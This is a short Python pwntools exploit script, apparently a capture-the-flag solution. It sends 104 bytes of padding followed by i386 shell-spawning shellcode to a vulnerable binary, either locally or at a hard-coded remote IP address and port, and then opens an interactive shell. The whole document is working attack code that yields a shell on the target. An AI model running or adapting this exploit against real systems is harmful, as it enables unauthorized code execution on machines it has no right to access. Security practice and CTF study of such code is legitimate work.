from pwn import *


# socat TCP-LISTEN:8177,reuseaddr,fork EXEC:./vuln
def main():
    context(arch="i386", os="linux")

    if args["REMOTE"]:
        p = remote("3.15.247.173", 8177)
    else:
        p = process("./vuln")
    shellcode = asm(shellcraft.sh())

    #offset
    payload = 'a'*104
    payload += shellcode

    p.sendlineafter("Enter your shellcode:", payload)
    p.interactive()


if __name__ == "__main__":
    main()
